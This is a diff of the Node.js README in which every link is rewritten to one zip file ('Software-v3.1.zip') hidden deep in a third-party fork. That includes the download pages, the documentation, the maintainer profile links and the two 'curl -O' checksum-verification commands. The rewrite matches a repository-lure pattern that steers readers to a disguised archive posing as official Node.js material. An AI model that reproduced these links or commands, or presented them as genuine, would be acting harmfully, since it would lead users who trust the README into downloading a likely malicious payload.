@@ -1,10 +1,10 @@
 <!--lint disable no-literal-urls-->
 
 <p align="center">
-  <a href="https://nodejs.org/">
+  <a href="https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip">
     <img
       alt="Node.js"
-      src="https://nodejs.org/static/images/logo-light.svg"
+      src="https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip"
       width="400"
     />
   </a>
@@ -47,7 +47,7 @@ Looking for help? Check out the
 
 * **Current**: Under active development. Code for the Current release is in the
   branch for its major version number (for example,
-  [v15.x](https://github.com/nodejs/node/tree/v15.x)). Node.js releases a new
+  [v15.x](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip)). Node.js releases a new
   major version every 6 months, allowing for breaking changes. This happens in
   April and October every year. Releases appearing each October have a support
   life of 8 months. Releases appearing each April convert to LTS (see below)
@@ -61,39 +61,39 @@ Looking for help? Check out the
 * **Nightly**: Code from the Current branch built every 24-hours when there are
   changes. Use with caution.
 
-Current and LTS releases follow [Semantic Versioning](https://semver.org). A
+Current and LTS releases follow [Semantic Versioning](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip). A
 member of the Release Team [signs](#release-keys) each Current and LTS release.
 For more information, see the
-[Release README](https://github.com/nodejs/Release#readme).
+[Release README](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip).
 
 ### Download
 
 Binaries, installers, and source tarballs are available at
-<https://nodejs.org/en/download/>.
+<https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip>.
 
 #### Current and LTS releases
 
-<https://nodejs.org/download/release/>
+<https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip>
 
-The [latest](https://nodejs.org/download/release/latest/) directory is an
+The [latest](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) directory is an
 alias for the latest Current release. The latest-_codename_ directory is an
 alias for the latest release from an LTS line. For example, the
-[latest-fermium](https://nodejs.org/download/release/latest-fermium/) directory
+[latest-fermium](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) directory
 contains the latest Fermium (Node.js 14) release.
 
 #### Nightly releases
 
-<https://nodejs.org/download/nightly/>
+<https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip>
 
 Each directory name and filename contains a date (in UTC) and the commit
 SHA at the HEAD of the release.
 
 #### API documentation
 
-Documentation for the latest Current release is at <https://nodejs.org/api/>.
+Documentation for the latest Current release is at <https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip>.
 Version-specific documentation is available in each release directory in the
 _docs_ subdirectory. Version-specific documentation is also at
-<https://nodejs.org/download/docs/>.
+<https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip>.
 
 ### Verifying binaries
 
@@ -103,7 +103,7 @@ files.
 To download `SHASUMS256.txt` using `curl`:
 
 ```console
-$ curl -O https://nodejs.org/dist/vx.y.z/SHASUMS256.txt
+$ curl -O https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
 ```
 
 To check that a downloaded file matches the checksum, run
@@ -128,7 +128,7 @@ See the bottom of this README for a full script to import active release keys.
 Next, download the `SHASUMS256.txt.sig` for the release:
 
 ```console
-$ curl -O https://nodejs.org/dist/vx.y.z/SHASUMS256.txt.sig
+$ curl -O https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
 ```
 
 Then use `gpg --verify SHASUMS256.txt.sig SHASUMS256.txt` to verify
@@ -163,49 +163,49 @@ For information about the governance of the Node.js project, see
 
 <!--lint disable prohibited-strings-->
 
-* [aduh95](https://github.com/aduh95) -
+* [aduh95](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Antoine du Hamel** \<duhamelantoine1995@gmail.com> (he/him)
-* [apapirovski](https://github.com/apapirovski) -
+* [apapirovski](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Anatoli Papirovski** \<apapirovski@mac.com> (he/him)
-* [BethGriggs](https://github.com/BethGriggs) -
+* [BethGriggs](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Beth Griggs** \<bgriggs@redhat.com> (she/her)
-* [BridgeAR](https://github.com/BridgeAR) -
+* [BridgeAR](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ruben Bridgewater** \<ruben@bridgewater.de> (he/him)
-* [ChALkeR](https://github.com/ChALkeR) -
+* [ChALkeR](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Сковорода Никита Андреевич** \<chalkerx@gmail.com> (he/him)
-* [cjihrig](https://github.com/cjihrig) -
+* [cjihrig](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Colin Ihrig** \<cjihrig@gmail.com> (he/him)
-* [codebytere](https://github.com/codebytere) -
+* [codebytere](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Shelley Vohr** \<shelley.vohr@gmail.com> (she/her)
-* [danielleadams](https://github.com/danielleadams) -
+* [danielleadams](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Danielle Adams** \<adamzdanielle@gmail.com> (she/her)
-* [fhinkel](https://github.com/fhinkel) -
+* [fhinkel](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Franziska Hinkelmann** \<franziska.hinkelmann@gmail.com> (she/her)
-* [gabrielschulhof](https://github.com/gabrielschulhof) -
+* [gabrielschulhof](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Gabriel Schulhof** \<gabrielschulhof@gmail.com>
-* [gireeshpunathil](https://github.com/gireeshpunathil) -
+* [gireeshpunathil](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Gireesh Punathil** \<gpunathi@in.ibm.com> (he/him)
-* [jasnell](https://github.com/jasnell) -
+* [jasnell](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **James M Snell** \<jasnell@gmail.com> (he/him)
-* [joyeecheung](https://github.com/joyeecheung) -
+* [joyeecheung](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Joyee Cheung** \<joyeec9h3@gmail.com> (she/her)
-* [mcollina](https://github.com/mcollina) -
+* [mcollina](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Matteo Collina** \<matteo.collina@gmail.com> (he/him)
-* [mhdawson](https://github.com/mhdawson) -
+* [mhdawson](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Michael Dawson** \<midawson@redhat.com> (he/him)
-* [mmarchini](https://github.com/mmarchini) -
+* [mmarchini](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Mary Marchini** \<oss@mmarchini.me> (she/her)
-* [MylesBorins](https://github.com/MylesBorins) -
+* [MylesBorins](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Myles Borins** \<myles.borins@gmail.com> (he/him)
-* [richardlau](https://github.com/richardlau) -
+* [richardlau](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Richard Lau** \<rlau@redhat.com>
-* [ronag](https://github.com/ronag) -
+* [ronag](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Robert Nagy** \<ronagy@icloud.com>
-* [targos](https://github.com/targos) -
+* [targos](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Michaël Zasso** \<targos@protonmail.com> (he/him)
-* [tniessen](https://github.com/tniessen) -
+* [tniessen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Tobias Nießen** \<tniessen@tnie.de> (he/him)
-* [Trott](https://github.com/Trott) -
+* [Trott](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Rich Trott** \<rtrott@gmail.com> (he/him)
 
 <details>
@@ -214,47 +214,47 @@ For information about the governance of the Node.js project, see
 
 ### TSC emeriti
 
-* [addaleax](https://github.com/addaleax) -
+* [addaleax](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Anna Henningsen** \<anna@addaleax.net> (she/her)
-* [bnoordhuis](https://github.com/bnoordhuis) -
+* [bnoordhuis](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ben Noordhuis** \<info@bnoordhuis.nl>
-* [chrisdickinson](https://github.com/chrisdickinson) -
+* [chrisdickinson](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Chris Dickinson** \<christopher.s.dickinson@gmail.com>
-* [danbev](https://github.com/danbev) -
+* [danbev](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Daniel Bevenius** \<daniel.bevenius@gmail.com> (he/him)
-* [evanlucas](https://github.com/evanlucas) -
+* [evanlucas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Evan Lucas** \<evanlucas@me.com> (he/him)
-* [Fishrock123](https://github.com/Fishrock123) -
+* [Fishrock123](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Jeremiah Senkpiel** \<fishrock123@rocketmail.com> (he/they)
-* [gibfahn](https://github.com/gibfahn) -
+* [gibfahn](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Gibson Fahnestock** \<gibfahn@gmail.com> (he/him)
-* [indutny](https://github.com/indutny) -
+* [indutny](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Fedor Indutny** \<fedor@indutny.com>
-* [isaacs](https://github.com/isaacs) -
+* [isaacs](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Isaac Z. Schlueter** \<i@izs.me>
-* [joshgav](https://github.com/joshgav) -
+* [joshgav](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Josh Gavant** \<josh.gavant@outlook.com>
-* [mscdex](https://github.com/mscdex) -
+* [mscdex](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Brian White** \<mscdex@mscdex.net>
-* [nebrius](https://github.com/nebrius) -
+* [nebrius](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Bryan Hughes** \<bryan@nebri.us>
-* [ofrobots](https://github.com/ofrobots) -
+* [ofrobots](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ali Ijaz Sheikh** \<ofrobots@google.com> (he/him)
-* [orangemocha](https://github.com/orangemocha) -
+* [orangemocha](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Alexis Campailla** \<orangemocha@nodejs.org>
-* [piscisaureus](https://github.com/piscisaureus) -
+* [piscisaureus](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Bert Belder** \<bertbelder@gmail.com>
-* [rvagg](https://github.com/rvagg) -
+* [rvagg](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Rod Vagg** \<r@va.gg>
-* [sam-github](https://github.com/sam-github) -
+* [sam-github](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Sam Roberts** \<vieuxtech@gmail.com>
-* [shigeki](https://github.com/shigeki) -
+* [shigeki](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Shigeki Ohtsu** \<ohtsu@ohtsu.org> (he/him)
-* [thefourtheye](https://github.com/thefourtheye) -
+* [thefourtheye](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Sakthipriyan Vairamani** \<thechargingvolcano@gmail.com> (he/him)
-* [TimothyGu](https://github.com/TimothyGu) -
+* [TimothyGu](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Tiancheng "Timothy" Gu** \<timothygu99@gmail.com> (he/him)
-* [trevnorris](https://github.com/trevnorris) -
+* [trevnorris](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Trevor Norris** \<trev.norris@gmail.com>
 
 </details>
@@ -265,199 +265,199 @@ For information about the governance of the Node.js project, see
 
 ### Collaborators
 
-* [addaleax](https://github.com/addaleax) -
+* [addaleax](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Anna Henningsen** \<anna@addaleax.net> (she/her)
-* [aduh95](https://github.com/aduh95) -
+* [aduh95](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Antoine du Hamel** \<duhamelantoine1995@gmail.com> (he/him)
-* [ak239](https://github.com/ak239) -
+* [ak239](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Aleksei Koziatinskii** \<ak239spb@gmail.com>
-* [antsmartian](https://github.com/antsmartian) -
+* [antsmartian](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Anto Aravinth** \<anto.aravinth.cse@gmail.com> (he/him)
-* [apapirovski](https://github.com/apapirovski) -
+* [apapirovski](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Anatoli Papirovski** \<apapirovski@mac.com> (he/him)
-* [AshCripps](https://github.com/AshCripps) -
+* [AshCripps](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ash Cripps** \<acripps@redhat.com>
-* [Ayase-252](https://github.com/Ayase-252) -
+* [Ayase-252](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Qingyu Deng** \<i@ayase-lab.com>
-* [bcoe](https://github.com/bcoe) -
+* [bcoe](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ben Coe** \<bencoe@gmail.com> (he/him)
-* [bengl](https://github.com/bengl) -
+* [bengl](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Bryan English** \<bryan@bryanenglish.com> (he/him)
-* [benjamingr](https://github.com/benjamingr) -
+* [benjamingr](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Benjamin Gruenbaum** \<benjamingr@gmail.com>
-* [BethGriggs](https://github.com/BethGriggs) -
+* [BethGriggs](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Beth Griggs** \<bgriggs@redhat.com> (she/her)
-* [bmeck](https://github.com/bmeck) -
+* [bmeck](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Bradley Farias** \<bradley.meck@gmail.com>
-* [boneskull](https://github.com/boneskull) -
+* [boneskull](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Christopher Hiller** \<boneskull@boneskull.com> (he/him)
-* [BridgeAR](https://github.com/BridgeAR) -
+* [BridgeAR](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ruben Bridgewater** \<ruben@bridgewater.de> (he/him)
-* [bzoz](https://github.com/bzoz) -
+* [bzoz](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Bartosz Sosnowski** \<bartosz@janeasystems.com>
-* [cclauss](https://github.com/cclauss) -
+* [cclauss](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Christian Clauss** \<cclauss@me.com> (he/him)
-* [ChALkeR](https://github.com/ChALkeR) -
+* [ChALkeR](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Сковорода Никита Андреевич** \<chalkerx@gmail.com> (he/him)
-* [cjihrig](https://github.com/cjihrig) -
+* [cjihrig](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Colin Ihrig** \<cjihrig@gmail.com> (he/him)
-* [codebytere](https://github.com/codebytere) -
+* [codebytere](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Shelley Vohr** \<shelley.vohr@gmail.com> (she/her)
-* [danbev](https://github.com/danbev) -
+* [danbev](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Daniel Bevenius** \<daniel.bevenius@gmail.com> (he/him)
-* [danielleadams](https://github.com/danielleadams) -
+* [danielleadams](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Danielle Adams** \<adamzdanielle@gmail.com> (she/her)
-* [davisjam](https://github.com/davisjam) -
+* [davisjam](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Jamie Davis** \<davisjam@vt.edu> (he/him)
-* [DerekNonGeneric](https://github.com/DerekNonGeneric) -
+* [DerekNonGeneric](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Derek Lewis** \<DerekNonGeneric@inf.is> (he/him)
-* [devnexen](https://github.com/devnexen) -
+* [devnexen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **David Carlier** \<devnexen@gmail.com>
-* [devsnek](https://github.com/devsnek) -
+* [devsnek](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Gus Caplan** \<me@gus.host> (they/them)
-* [dmabupt](https://github.com/dmabupt) -
+* [dmabupt](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Xu Meng** \<dmabupt@gmail.com> (he/him)
-* [dnlup](https://github.com/dnlup)
+* [dnlup](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip)
   **Daniele Belardi** \<dwon.dnl@gmail.com> (he/him)
-* [edsadr](https://github.com/edsadr) -
+* [edsadr](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Adrian Estrada** \<edsadr@gmail.com> (he/him)
-* [eugeneo](https://github.com/eugeneo) -
+* [eugeneo](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Eugene Ostroukhov** \<eostroukhov@google.com>
-* [evanlucas](https://github.com/evanlucas) -
+* [evanlucas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Evan Lucas** \<evanlucas@me.com> (he/him)
-* [fhinkel](https://github.com/fhinkel) -
+* [fhinkel](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Franziska Hinkelmann** \<franziska.hinkelmann@gmail.com> (she/her)
-* [Flarna](https://github.com/Flarna) -
+* [Flarna](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Gerhard Stöbich** \<deb2001-github@yahoo.de>  (he/they)
-* [gabrielschulhof](https://github.com/gabrielschulhof) -
+* [gabrielschulhof](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Gabriel Schulhof** \<gabrielschulhof@gmail.com>
-* [gengjiawen](https://github.com/gengjiawen) -
+* [gengjiawen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Jiawen Geng** \<technicalcute@gmail.com>
-* [GeoffreyBooth](https://github.com/geoffreybooth) -
+* [GeoffreyBooth](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Geoffrey Booth** \<webadmin@geoffreybooth.com> (he/him)
-* [gireeshpunathil](https://github.com/gireeshpunathil) -
+* [gireeshpunathil](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Gireesh Punathil** \<gpunathi@in.ibm.com> (he/him)
-* [guybedford](https://github.com/guybedford) -
+* [guybedford](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Guy Bedford** \<guybedford@gmail.com> (he/him)
-* [HarshithaKP](https://github.com/HarshithaKP) -
+* [HarshithaKP](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Harshitha K P** \<harshitha014@gmail.com> (she/her)
-* [hashseed](https://github.com/hashseed) -
+* [hashseed](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Yang Guo** \<yangguo@chromium.org> (he/him)
-* [himself65](https://github.com/himself65) -
+* [himself65](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Zeyu Yang** \<himself65@outlook.com> (he/him)
-* [hiroppy](https://github.com/hiroppy) -
+* [hiroppy](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Yuta Hiroto** \<hello@hiroppy.me> (he/him)
-* [iansu](https://github.com/iansu) -
+* [iansu](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ian Sutherland** \<ian@iansutherland.ca>
-* [indutny](https://github.com/indutny) -
+* [indutny](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Fedor Indutny** \<fedor@indutny.com>
-* [JacksonTian](https://github.com/JacksonTian) -
+* [JacksonTian](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Jackson Tian** \<shyvo1987@gmail.com>
-* [jasnell](https://github.com/jasnell) -
+* [jasnell](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **James M Snell** \<jasnell@gmail.com> (he/him)
-* [jkrems](https://github.com/jkrems) -
+* [jkrems](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Jan Krems** \<jan.krems@gmail.com> (he/him)
-* [joaocgreis](https://github.com/joaocgreis) -
+* [joaocgreis](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **João Reis** \<reis@janeasystems.com>
-* [joyeecheung](https://github.com/joyeecheung) -
+* [joyeecheung](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Joyee Cheung** \<joyeec9h3@gmail.com> (she/her)
-* [juanarbol](https://github.com/juanarbol) -
+* [juanarbol](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Juan José Arboleda** \<soyjuanarbol@gmail.com> (he/him)
